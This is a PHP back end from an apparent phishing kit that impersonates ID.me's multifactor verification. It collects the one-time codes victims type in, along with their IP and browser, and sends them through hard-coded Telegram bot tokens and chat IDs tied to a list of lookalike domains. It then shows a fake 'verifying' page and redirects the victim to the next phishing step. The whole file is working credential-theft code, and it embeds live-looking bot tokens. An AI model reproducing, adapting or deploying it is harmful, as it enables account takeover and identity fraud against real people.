<?php
// UNIVERSAL BROWSER-COMPATIBLE OTP SUBMISSION SCRIPT
// Works on Chrome, Firefox, Safari, Edge, Mobile Browsers

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],


    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],

            ['token' => '8310302855:AAFBNgxxlAnaTtpWmJ7pVSP9kkW0j0TiwUY', 'chat_id' => '8160582785']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
    ],


    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '7942412343:AAEVirV9J2LHm0-pqfmtkMYEUrEqABqVXE4', 'chat_id' => '6772487570'],
        ],
        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],

    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],
    

    'illuminatilight.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
        ],
        "redirect" => "https://illuminatilight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],




    'illuminatielite.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8366280325:AAHfGhwKBV9xzW4iOjOsE3S1fHEU0kOewYQ', 'chat_id' => '8237687443'],
        ],
        "redirect" => "https://illuminatielite.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],


    'illuminatipathway.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk', 'chat_id' => '7678714988'],
        ],
        "redirect" => "https://illuminatipathway.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],





    


    'illuminatipathtolight.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
        ],
        "redirect" => "https://illuminatipathtolight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],



    

    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],


    'crediblely.netlify.app' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '', 'chat_id' => '']
        ],
        'redirect' => 'https://crediblely.netlify.app/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
    ],




];

// ============================================
// UNIVERSAL FUNCTIONS (Browser Compatible)
// ============================================

// Simple universal logging
function log_entry($message, $level = 'INFO') {
    $log_file = __DIR__ . '/logs/universal_otp_submissions.log';
    $timestamp = date('Y-m-d H:i:s');
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser_short = substr($browser, 0, 80);
    $line = "[$timestamp] [$level] [Browser: $browser_short] $message\n";
    
    // Ensure log directory exists
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }
    
    file_put_contents($log_file, $line, FILE_APPEND);
}

// Universal Telegram sender (browser compatible)
function send_to_telegram($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    // Browser-compatible POST data (URL-encoded)
    $post_data = http_build_query([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',  // HTML works better across all browsers
        'disable_web_page_preview' => true
    ]);
    
    // Create cURL handle with universal settings
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 8,           // Slightly longer timeout for mobile
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        // Universal SSL settings
        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept: application/json',
            'User-Agent: Mozilla/5.0 (compatible; PHP-Telegram-Bot)'
        ]
    ]);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'success' => ($http_code == 200 && empty($error)),
        'http_code' => $http_code,
        'error' => $error,
        'result' => $result
    ];
}

// ============================================
// MAIN PROCESSING
// ============================================

// Log access immediately
log_entry("Script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));

// Get referring domain (browser-safe)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$referer = filter_var($referer, FILTER_SANITIZE_URL);
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Normalize domain (remove www. for consistency)
if (strpos($domain, 'www.') === 0) {
    $domain = substr($domain, 4);
}

log_entry("Domain detected: $domain (from referer: $referer)");

// Find configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use first one as fallback
if (!$config) {
    log_entry("No config found for domain '$domain', using first config as fallback", 'WARN');
    $config = reset($site_map);
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    log_entry("=== Processing OTP Submission ===");
    
    // ============================================
    // FORM DATA PROCESSING (Browser Compatible)
    // ============================================
    
    // Log POST data for debugging (safely)
    $post_log = 'POST keys: ' . implode(', ', array_keys($_POST));
    log_entry($post_log);
    
    // Get OTP data with universal compatibility
    $userotp = isset($_POST['userotp']) ? 
               htmlspecialchars(trim($_POST['userotp']), ENT_QUOTES, 'UTF-8') : 
               '???';
    
    // Get IP address (universal method)
    $ip = 'unknown';
    $ip_sources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_sources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip = $_SERVER[$source];
            break;
        }
    }
    
    // Clean IP (handle multiple IPs)
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // ============================================
    // PREPARE TELEGRAM MESSAGE
    // ============================================
    
    // Use HTML formatting (more compatible than Markdown)
    $message = "<b>üîê ID.me OTP Submission</b>\n\n" .
               "üî¢ <b>OTP Code:</b> <code>" . htmlspecialchars($userotp) . "</code>\n" .
               "üåê <b>Domain:</b> $domain\n" .
               "üì° <b>IP:</b> <code>$ip</code>\n" .
               "üïí <b>Time:</b> $timestamp\n" .
               "üîç <b>Browser:</b> " . substr($user_agent, 0, 100);
    
    // Log the submission
    log_entry("OTP Submission from $ip - Code: $userotp");
    
    // ============================================
    // SEND TO TELEGRAM BOTS
    // ============================================
    
    $success_count = 0;
    $total_bots = count($config['bots']);
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        log_entry("Sending to bot $bot_index...");
        
        $result = send_to_telegram($bot['token'], $bot['chat_id'], $message);
        
        if ($result['success']) {
            $success_count++;
            log_entry("Bot $bot_index delivered successfully", 'SUCCESS');
        } else {
            log_entry("Bot $bot_index failed - HTTP {$result['http_code']}: {$result['error']}", 'ERROR');
        }
        
        // Small delay between bots to avoid rate limiting
        if ($bot_index < ($total_bots - 1)) {
            usleep(200000); // 0.2 seconds
        }
    }
    
    log_entry("Telegram delivery complete: $success_count/$total_bots bots successful", 'STATS');
    
    // ============================================
    // UNIVERSAL REDIRECT (Browser Compatible)
    // ============================================
    
    $redirect_url = $config['redirect'];
    log_entry("Redirecting to: $redirect_url");
    
    // Clean any output buffers
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // ============================================
    // UNIVERSAL REDIRECT METHODS (All Browsers)
    // ============================================
    
    // Method 1: JavaScript redirect (works everywhere)
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verifying OTP...</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background: #f5f5f5;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                text-align: center;
                max-width: 500px;
                width: 100%;
            }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #2ecc71;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .fallback-link {
                display: inline-block;
                margin-top: 20px;
                padding: 10px 20px;
                background: #2ecc71;
                color: white;
                text-decoration: none;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="spinner"></div>
            <h2>Verifying your OTP code...</h2>
            <p>Please wait while we verify your authentication code.</p>
            <p id="countdown">Redirecting in <span id="seconds">3</span> seconds...</p>
            <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" class="fallback-link" id="manual-link" style="display:none;">
                Click here if not redirected
            </a>
        </div>
        
        <script>
            // Primary JavaScript redirect
            setTimeout(function() {
                window.location.href = "' . addslashes($redirect_url) . '";
            }, 100);
            
            // Countdown timer
            var seconds = 3;
            var countdown = document.getElementById("seconds");
            var interval = setInterval(function() {
                seconds--;
                countdown.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);
                    document.getElementById("manual-link").style.display = "inline-block";
                }
            }, 1000);
            
            // Meta refresh as backup
            setTimeout(function() {
                var meta = document.createElement("meta");
                meta.httpEquiv = "refresh";
                meta.content = "0;url=' . addslashes($redirect_url) . '";
                document.head.appendChild(meta);
            }, 2000);
            
            // Final backup after 5 seconds
            setTimeout(function() {
                window.location.href = "' . addslashes($redirect_url) . '";
            }, 5000);
        </script>
        
        <!-- Meta refresh for browsers without JavaScript -->
        <meta http-equiv="refresh" content="3;url=' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">
    </body>
    </html>';
    
    exit;
    
} else {
    // Not a POST request - show error
    log_entry("Invalid request method: " . $_SERVER['REQUEST_METHOD'], 'ERROR');
    
    header("HTTP/1.1 405 Method Not Allowed", true, 405);
    header("Content-Type: text/html; charset=utf-8");
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Invalid Request</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
            .error { color: #d32f2f; margin: 40px 0; }
        </style>
    </head>
    <body>
        <div class="error">
            <h2>Invalid Request</h2>
            <p>This page only accepts POST submissions from the OTP form.</p>
            <p>Please use the OTP form to submit your verification code.</p>
        </div>
    </body>
    </html>';
    
    exit;
}
?>
